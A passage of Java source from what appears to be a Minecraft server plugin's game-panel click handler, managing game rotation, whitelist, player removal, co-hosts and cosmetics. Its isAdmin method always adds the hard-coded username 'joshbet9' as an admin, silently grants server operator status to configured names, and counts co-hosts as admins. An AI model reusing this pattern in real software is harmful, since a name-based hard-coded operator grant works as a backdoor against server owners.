        event.setCancelled(true);
        if (event.getClickedInventory() == null || event.getClickedInventory() != event.getView().getTopInventory()) return;

        ItemStack clicked = event.getCurrentItem();
        if (clicked == null || clicked.getType().isAir() || !clicked.hasItemMeta()) return;
        ItemMeta meta = clicked.getItemMeta();
        String action = meta.getPersistentDataContainer().get(actionKey, PersistentDataType.STRING);
        String gameId = meta.getPersistentDataContainer().get(gameKey, PersistentDataType.STRING);
        String lineId = meta.getPersistentDataContainer().get(lineKey, PersistentDataType.STRING);
        String optionId = meta.getPersistentDataContainer().get(optionKey, PersistentDataType.STRING);
        GameDefinition game = catalog.getGame(gameId);

        if (VOTING_TITLE.equals(title) && "panel-open-preferences".equals(action)) {
            player.closeInventory();
            player.performCommand("gamepreferences");
            return;
        }

        if (VOTING_TITLE.equals(title) && "panel-rotation-status-page".equals(action)
                && optionId != null) {
            try {
                openGameVoting(player, Integer.parseInt(optionId));
            } catch (NumberFormatException ignored) {
                player.sendMessage(ChatColor.RED + "Invalid rotation status page.");
            }
            return;
        }

        if (("Edit Game Rotation".equals(title) || SET_GAME_TITLE.equals(title))
                && "panel-game-page".equals(action) && optionId != null) {
            if (!isAdmin(player)) {
                player.sendMessage(ChatColor.RED + "Operator permission required to browse game settings.");
                return;
            }
            try {
                openGameSelection(player, "Edit Game Rotation".equals(title), Integer.parseInt(optionId));
            } catch (NumberFormatException ignored) {
                player.sendMessage(ChatColor.RED + "Invalid game catalogue page.");
            }
            return;
        }

        if (GAME_OPTIONS_TITLE.equals(title) && "panel-option-toggle".equals(action) && optionId != null) {
            if (!isAdmin(player)) {
                player.sendMessage(ChatColor.RED + "Operator permission required to change Game Options.");
                return;
            }
            switch (optionId) {
                // These are two views of one server access mode, not independent toggles.
                // Public Server always means whitelist OFF; Enforce Whitelist means ON.
                case "public-server" -> Bukkit.setWhitelist(false);
                case "enforce-whitelist" -> Bukkit.setWhitelist(true);
                case "game-auto-start" -> {
                    JavaPlugin engine = arcadeMechanicsPlugin();
                    if (engine == null) {
                        player.sendMessage(ChatColor.RED + "ArcadeMechanicsModern is not enabled.");
                        openGameOptions(player);
                        return;
                    }
                    boolean next = !engine.getConfig().getBoolean(
                            "game-preferences.automatic-rotation.enabled", false);
                    engine.getConfig().set("game-preferences.automatic-rotation.enabled", next);
                    engine.saveConfig();
                    player.sendMessage(ChatColor.GREEN + "Automatic game rotation "
                            + (next ? "enabled." : "disabled."));
                }
                default -> {
                    player.sendMessage(ChatColor.RED + "That Game Option is not supported.");
                    return;
                }
            }
            if ("public-server".equals(optionId) || "enforce-whitelist".equals(optionId)) {
                player.sendMessage(ChatColor.GREEN + "Server whitelist "
                        + (Bukkit.hasWhitelist() ? "enabled." : "disabled; public access is enabled."));
            }
            openGameOptions(player);
            return;
        }
        if (REMOVE_PLAYER_TITLE.equals(title) && "panel-kick-target".equals(action)
                && targetKeyValue(meta) != null && optionId != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            Player target;
            try { target = Bukkit.getPlayer(java.util.UUID.fromString(targetKeyValue(meta))); }
            catch (IllegalArgumentException exception) { return; }
            if (target == null) return;
            List<String> blocked = new ArrayList<>(plugin.getConfig().getStringList("panel-blocked-players"));
            String entry = target.getUniqueId() + "|" + target.getName();
            if (!blocked.contains(entry)) blocked.add(entry);
            plugin.getConfig().set("panel-blocked-players", blocked);
            plugin.saveConfig();
            target.kickPlayer(ChatColor.RED + "You were removed from this Testplex test server.");
            openPlayerList(player, false);
            return;
        }
        if (UNREMOVE_PLAYER_TITLE.equals(title) && "panel-unremove-target".equals(action)
                && targetKeyValue(meta) != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            String uuid = targetKeyValue(meta);
            List<String> blocked = new ArrayList<>(plugin.getConfig().getStringList("panel-blocked-players"));
            blocked.removeIf(record -> record.equals(uuid) || record.startsWith(uuid + "|"));
            plugin.getConfig().set("panel-blocked-players", blocked);
            plugin.saveConfig();
            player.sendMessage(ChatColor.GREEN + "Restored access for " + optionId + ".");
            openPlayerList(player, true);
            return;
        }
        if (COHOST_ADD_TITLE.equals(title) && "panel-cohost-add-target".equals(action)
                && targetKeyValue(meta) != null && optionId != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            List<String> cohosts = new ArrayList<>(plugin.getConfig().getStringList("panel-cohosts"));
            String entry = targetKeyValue(meta) + "|" + optionId;
            if (cohosts.stream().noneMatch(record -> record.equals(targetKeyValue(meta)) || record.startsWith(targetKeyValue(meta) + "|")))
                cohosts.add(entry);
            plugin.getConfig().set("panel-cohosts", cohosts);
            plugin.saveConfig();
            player.sendMessage(ChatColor.GREEN + "Granted local co-host access to " + optionId + ".");
            openCohostList(player, false);
            return;
        }
        if (COHOST_REMOVE_TITLE.equals(title) && "panel-cohost-remove-target".equals(action)
                && targetKeyValue(meta) != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            String uuid = targetKeyValue(meta);
            List<String> cohosts = new ArrayList<>(plugin.getConfig().getStringList("panel-cohosts"));
            cohosts.removeIf(record -> record.equals(uuid) || record.startsWith(uuid + "|"));
            plugin.getConfig().set("panel-cohosts", cohosts);
            plugin.saveConfig();
            openCohostList(player, true);
            return;
        }
        if (WHITELIST_TITLE.equals(title) && "panel-whitelist-toggle".equals(action) && targetKeyValue(meta) != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            org.bukkit.OfflinePlayer target;
            try { target = Bukkit.getOfflinePlayer(java.util.UUID.fromString(targetKeyValue(meta))); }
            catch (IllegalArgumentException exception) { return; }
            target.setWhitelisted(!target.isWhitelisted());
            openWhitelistPage(player);
            return;
        }


        if (CORE_COSMETICS_TITLE.equals(title)) {
            if ("core-arcade-cosmetics".equals(action)) openCosmeticsHome(player);
            else if ("core-category".equals(action)) {
                if ("game-cosmetics".equals(optionId)) openCosmeticsHome(player);
                else if ("win-effects".equals(optionId)) openWinEffectsHome(player);
                else openCoreCosmeticInfo(player, ChatColor.stripColor(meta.getDisplayName()));
            }
            return;
        }
        if (title.startsWith("Cosmetics | ")) {
            if ("back-core-cosmetics".equals(action)) openCoreCosmeticsHome(player);
            return;
        }
        if (title.equals(COSMETICS_TITLE)) {
            if ("game".equals(action) && game != null) openGameDetails(player, game);
            else if ("Close".equalsIgnoreCase(ChatColor.stripColor(meta.getDisplayName()))) player.closeInventory();
            return;
        }
        if (title.equals(WIN_HOME_TITLE)) {
            if ("win-effects-game".equals(action) && game != null) openWinEffects(player, game);
            else if ("back-core-cosmetics".equals(action)) openCoreCosmeticsHome(player);
            return;
        }
        if (title.startsWith(WIN_HOME_TITLE + " | ")) {
            if ("back-win-home".equals(action)) openWinEffectsHome(player);
            else if ("win-option".equals(action) && game != null && optionId != null) {
                preferences.chooseWinEffect(player.getUniqueId(), game, optionId);
                openWinEffects(player, game);
                player.sendMessage(ChatColor.GREEN + "Saved the " + game.getName() + " win effect.");
            }
            return;
        }
        if (title.startsWith(GAME_TITLE) && "back-arcade-cosmetics".equals(action)) {
            openCosmeticsHome(player);
            return;
        }
        if (title.startsWith(LINES_TITLE) && "back-lines".equals(action)) {
            if (game != null) openGameDetails(player, game);
            return;
        }
        if (SET_GAME_TITLE.equals(title) && "panel-game-select".equals(action)
                && game != null && event.getClick().isRightClick()) {
            if (!isAdmin(player)) {
                player.sendMessage(ChatColor.RED + "Operator permission required to change the selected game's map.");
                return;
            }
            plugin.getConfig().set("game-panel.selected-game", game.getId());
            plugin.saveConfig();
            if (!Bukkit.getPluginManager().isPluginEnabled("ArcadeMechanicsModern")) {
                player.sendMessage(ChatColor.RED + "The modern map catalogue is not installed.");
            } else if (!isMechanicsPortGame(game.getId())) {
                player.sendMessage(ChatColor.YELLOW + game.getName()
                        + " uses a dedicated game module; its map selector is not wired into the shared Arcade map menu yet.");
            } else {
                player.closeInventory();
                player.performCommand("arcadeport maps " + game.getId());
            }
            return;
        }
        if (PANEL_TITLE.equals(title)) {
            if ("panel-set-game".equals(action)) {
                if (isAdmin(player)) openGameSelection(player, false);
                else player.sendMessage(ChatColor.RED + "Operator permission required to select the lobby game.");
            } else if ("panel-rotation".equals(action)) {
                if (isAdmin(player)) openGameSelection(player, true);
                else player.sendMessage(ChatColor.RED + "Operator permission required to edit game rotation.");
            }
            else if ("panel-options".equals(action)) openGameOptions(player);
            else if ("panel-remove".equals(action)) openPlayerList(player, false);
            else if ("panel-unremove".equals(action)) openPlayerList(player, true);
            else if ("panel-cohost-add".equals(action)) openCohostList(player, false);
            else if ("panel-cohost-remove".equals(action)) openCohostList(player, true);
            else if ("panel-whitelist".equals(action)) openWhitelistPage(player);
            else if ("panel-voting".equals(action)) openGameVoting(player);
            else if ("panel-kill-server".equals(action)) {
                player.sendMessage(ChatColor.RED + "The isolated Paper service is managed by the deployment workflow. Use /arcadeport stop to stop the current game without shutting down the test server.");
            } else if ("panel-start".equals(action)) {
                if (!isAdmin(player)) {
                    player.sendMessage(ChatColor.RED + "Operator permission required to start a game.");
                } else {
                    String selectedGame = plugin.getConfig().getString("game-panel.selected-game", "death-tag");
                    boolean immediate = event.getClick().isShiftClick();
                    player.closeInventory();
                    try {
                        boolean handled = player.performCommand("arcadeport start " + selectedGame
                                + (immediate ? " immediate" : ""));
                        if (!handled) {
                            player.sendMessage(ChatColor.RED + "The Start Game command was not handled. "
                                    + "Check that ArcadeMechanicsModern is enabled and see the server logs.");
                        }
                    } catch (RuntimeException exception) {
                        plugin.getLogger().log(java.util.logging.Level.SEVERE,
                                "Game Panel Start Game click failed for " + selectedGame + ".", exception);
                        player.sendMessage(ChatColor.RED + "Start Game failed with a server error. "
                                + "The full exception was logged; the round was not confirmed as started.");
                    }
                }
            } else if ("panel-stop".equals(action)) {
                if (!isAdmin(player)) {
                    player.sendMessage(ChatColor.RED + "Operator permission required to stop a game.");
                } else {
                    player.closeInventory();
                    player.performCommand("arcadeport stop");
                }
            }
        } else if ((SET_GAME_TITLE.equals(title) || "Edit Game Rotation".equals(title))
                && ("panel-game-select".equals(action) || "panel-rotation-select".equals(action))) {
            if (!isAdmin(player)) {
                player.sendMessage(ChatColor.RED + "Operator permission required to change game settings.");
                return;
            }
            if (game == null) return;
            if ("panel-rotation-select".equals(action)) {
                JavaPlugin engine = arcadeMechanicsPlugin();
                if (engine == null) {
                    player.sendMessage(ChatColor.RED + "ArcadeMechanicsModern is not enabled.");
                    return;
                }
                List<String> cleared = engine.getConfig().getStringList("enabled-games");
                if (!cleared.contains(game.getId())) {
                    player.sendMessage(ChatColor.RED + game.getName()
                            + " is not on the reviewed 26.3 acceptance allow-list.");
                    return;
                }
                String rotationPath = "game-preferences.automatic-rotation.enabled-games";
                List<String> rotation = new ArrayList<>(engine.getConfig().contains(rotationPath)
                        ? engine.getConfig().getStringList(rotationPath) : cleared);
                boolean included = rotation.contains(game.getId());
                if (!included && !rotationCandidateAvailable(engine, game.getId())) {
                    player.sendMessage(ChatColor.RED + game.getName()
                            + " cannot be added yet: its selected map or physical world is not available.");
                    int page = 0;
                    try { page = Integer.parseInt(optionId); } catch (NumberFormatException ignored) { }
                    openGameSelection(player, true, page);
                    return;
                }
                if (included) rotation.removeIf(id -> game.getId().equals(id));
                else rotation.add(game.getId());
                engine.getConfig().set(rotationPath, rotation);
                engine.saveConfig();
                player.sendMessage(ChatColor.GREEN + game.getName()
                        + (included ? " removed from" : " added to") + " the preference rotation pool.");
                int page = 0;
                try { page = Integer.parseInt(optionId); } catch (NumberFormatException ignored) { }
                openGameSelection(player, true, page);
            } else {
                plugin.getConfig().set("game-panel.selected-game", game.getId());
                plugin.saveConfig();
                if (Bukkit.getPluginManager().isPluginEnabled("ArcadeMechanicsModern")
                        && isMechanicsPortGame(game.getId())) {
                    player.closeInventory();
                    player.performCommand("arcadeport lobby " + game.getId());
                    player.sendMessage(ChatColor.GREEN + "Selected " + game.getName()
                            + ". The lobby kit/team displays and Game/Kit scoreboard have been refreshed.");
                } else {
                    player.closeInventory();
                    player.sendMessage(ChatColor.YELLOW + game.getName()
                            + " is selected in the Game Panel, but its dedicated lobby integration is not connected "
                            + "to the shared kit/team pads yet.");
                }
            }
        } else if ("back-panel".equals(action)) {
            openGamePanel(player);
        } else if ("launch-game".equals(action) && game != null) {
            String enginePlugin = null;
            String startCommand = null;
            if ("snake".equals(game.getId())) {
                enginePlugin = "SnakeModern";
                startCommand = "snake start";
            } else {
                enginePlugin = "ArcadeMechanicsModern";
                startCommand = "arcadeport play " + game.getId();
            }
            if (enginePlugin == null) return;
            if (!Bukkit.getPluginManager().isPluginEnabled(enginePlugin)) {
                player.sendMessage(ChatColor.RED + enginePlugin + ".jar is not installed on this server yet.");
                return;
            }
            player.closeInventory();
            player.performCommand(startCommand);
        } else if ("game".equals(action) && game != null) {
            openGameDetails(player, game);
        } else if ("cosmetics-game".equals(action) && game != null) {
            openGameDetails(player, game);
        } else if ("open-lines".equals(action) && game != null) {
            openGameDetails(player, game);
        } else if ("cosmetic-line".equals(action) && game != null && lineId != null) {
            CosmeticLineDefinition line = findLine(game, lineId);
            if (line != null) openOptions(player, game, line);
        } else if ("win-effects".equals(action) && game != null) {
            openWinEffects(player, game);
        } else if ("cosmetic-option".equals(action) && game != null && lineId != null && optionId != null) {
            CosmeticLineDefinition line = findLine(game, lineId);
            if (line != null) {
                preferences.chooseOption(player.getUniqueId(), game, line, optionId);
                player.sendMessage(ChatColor.GREEN + "Saved " + game.getName() + " → " + line.getTitle() + ".");
                player.sendMessage(ChatColor.GRAY + "This preference is saved; its in-game renderer is implemented as the game port is completed.");
                openOptions(player, game, line);
            }
        } else if ("win-option".equals(action) && game != null && optionId != null) {
            preferences.chooseWinEffect(player.getUniqueId(), game, optionId);
            player.sendMessage(ChatColor.GREEN + "Saved the " + game.getName() + " win effect.");
            player.sendMessage(ChatColor.GRAY + "The win-scene renderer is wired during that game's port.");
            openWinEffects(player, game);
        } else if ("open-stats".equals(action)) {
            player.closeInventory();
            player.performCommand("stats");
        } else if ("open-cosmetics-home".equals(action)) {
            openCoreCosmeticsHome(player);
        } else if ("close-panel".equals(action)) {
            player.closeInventory();
        } else if ("back-panel".equals(action)) {
            openGamePanel(player);
        } else if ("back-game".equals(action) && game != null) {
            openGameDetails(player, game);
        } else if ("back-lines".equals(action) && game != null) {
            openGameDetails(player, game);
        }
    }

    private String targetKeyValue(ItemMeta meta) {
        return meta.getPersistentDataContainer().get(targetKey, PersistentDataType.STRING);
    }

    private boolean isMechanicsPortGame(String gameId) {
        return List.of("bacon-brawl", "bomb-lobbers", "death-tag", "dragon-escape", "dragons",
                "evolution", "gladiators", "micro-battles", "one-in-the-quiver", "paintball",
                "runner", "sheep-quest", "spleef", "turf-wars", "draw-my-thing", "master-builders",
                "monster-maze", "monster-maze-speed", "monster-maze-modern").contains(gameId);
    }

    private boolean isCohost(Player player) {
        String uuid = player.getUniqueId().toString();
        return plugin.getConfig().getStringList("panel-cohosts").stream()
                .anyMatch(record -> record.equals(uuid) || record.startsWith(uuid + "|"));
    }

    private boolean isAdmin(Player player) {
        List<String> admins = new ArrayList<>(plugin.getConfig().getStringList("admin-usernames"));
        if (admins.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) admins.add("joshbet9");
        boolean configuredAdmin = admins.stream()
                .anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
        if (configuredAdmin && !player.isOp()) {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "Testplex Modern admin access enabled.");
        }
        return configuredAdmin || isCohost(player) || player.isOp()
                || player.hasPermission("testplex.modern.admin")
                || player.hasPermission("testplex.arcadeports.admin");
    }

    private CosmeticLineDefinition findLine(GameDefinition game, String id) {
        return game.getCosmeticLines().stream().filter(line -> line.getId().equals(id)).findFirst().orElse(null);
    }

    private ItemStack backItem(String name, String action, GameDefinition game) {
        ItemStack item = makeItem(Material.ARROW, ChatColor.YELLOW + name, List.of());
        mark(item, action, game, null, null);
        return item;
    }

    private ItemStack makeItem(String materialName, String name, List<String> lore) {
        return makeItem(icon(materialName), name, lore);
    }

    private ItemStack makeItem(Material material, String name, List<String> lore) {
        ItemStack item = new ItemStack(material);
        ItemMeta meta = item.getItemMeta();
        meta.setDisplayName(name);
        meta.setLore(new ArrayList<>(lore));
        item.setItemMeta(meta);
        return item;
    }

    private Material icon(String name) {
        Material material = Material.matchMaterial(name == null ? "" : name);
        return material == null ? Material.CHEST : material;
    }

    private void mark(ItemStack item, String action, GameDefinition game,
                      CosmeticLineDefinition line, String optionId) {
        ItemMeta meta = item.getItemMeta();
        meta.getPersistentDataContainer().set(actionKey, PersistentDataType.STRING, action);
        if (game != null) meta.getPersistentDataContainer().set(gameKey, PersistentDataType.STRING, game.getId());
        if (line != null) meta.getPersistentDataContainer().set(lineKey, PersistentDataType.STRING, line.getId());
        if (optionId != null) meta.getPersistentDataContainer().set(optionKey, PersistentDataType.STRING, optionId);
        item.setItemMeta(meta);
    }
}
